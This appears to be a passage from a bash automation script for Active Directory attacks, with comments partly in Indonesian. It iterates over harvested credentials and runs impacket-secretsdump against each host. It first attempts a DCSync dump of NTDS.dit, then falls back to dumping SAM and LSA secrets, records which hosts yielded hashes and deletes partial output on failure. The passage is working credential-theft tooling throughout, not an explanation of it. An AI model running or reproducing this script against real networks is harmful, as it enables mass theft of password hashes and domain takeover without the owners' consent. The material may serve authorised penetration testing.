        # --- STEP 1: JUST-DC ---
        echo -e "${GRAY}[CMD] timeout 120s impacket-secretsdump -just-dc \"$TARGET_STRING\" -outputfile \"$dump_out_name\"${NC}"
        echo -e "${BLUE}--- SECRETSDUMP JUST-DC OUTPUT ---${NC}"

        timeout 120s impacket-secretsdump -just-dc "$TARGET_STRING" -outputfile "$dump_out_name" 2>&1 | tee -a "$OUTDIR/secretsdump_run.log"

        echo -e "${BLUE}----------------------------------${NC}"

        # --- CHECK NTDS SUCCESS ---
        if [[ -s "${dump_out_name}.ntds" ]] && grep -q ":::" "${dump_out_name}.ntds"; then
            echo -e "${GREEN}[+++] SUCCESS! NTDS.dit dumped from $ip${NC}"
            echo -e "${GREEN}[+] Output saved to: ${dump_out_name}.ntds${NC}"

            echo "$ip" >> "$DUMPED_IPS_TRACKER"

        else
            echo -e "${YELLOW}[!] JUST-DC failed, trying full secretsdump...${NC}"

            # --- STEP 2: FULL DUMP ---
            echo -e "${GRAY}[CMD] timeout 180s impacket-secretsdump \"$TARGET_STRING\" -outputfile \"$dump_out_name\"${NC}"
            echo -e "${BLUE}--- SECRETSDUMP FULL OUTPUT ---${NC}"

            timeout 180s impacket-secretsdump "$TARGET_STRING" -outputfile "$dump_out_name" 2>&1 | tee -a "$OUTDIR/secretsdump_run.log"

            echo -e "${BLUE}--------------------------------${NC}"

            # --- CHECK LOCAL DUMP SUCCESS ---
            if [[ -s "${dump_out_name}.sam" || -s "${dump_out_name}.secrets" ]]; then
                echo -e "${GREEN}[+++] SUCCESS! SAM/LSA secrets dumped from $ip${NC}"
                echo -e "${GREEN}[+] Output files: ${dump_out_name}.sam / .secrets${NC}"

                echo "$ip" >> "$DUMPED_IPS_TRACKER"

            else
                echo -e "${RED}[-] Failed to dump any secrets from $ip using $cred_user${NC}"
                echo -e "${GRAY}[DEBUG] Check $OUTDIR/secretsdump_run.log${NC}"

                # cleanup kalau gagal
                rm -f "${dump_out_name}.ntds" "${dump_out_name}.sam" "${dump_out_name}.secrets" 2>/dev/null
            fi
        fi

        echo "------------------------------------------------------------"

            
        done < "$FINAL_CREDS_FILE"
        
        # Hapus file tracker setelah selesai phase 5
        rm -f "$DUMPED_IPS_TRACKER"
fi

if [[ -s "$BROKEN_PIPE_LOG" ]]; then
    echo -e "\n${RED}[!] HOSTS WITH CONNECTION TIMEOUTS / BROKEN PIPE:${NC}"
    echo -e "${GRAY}------------------------------------------------------------${NC}"
    cat "$BROKEN_PIPE_LOG"
fi
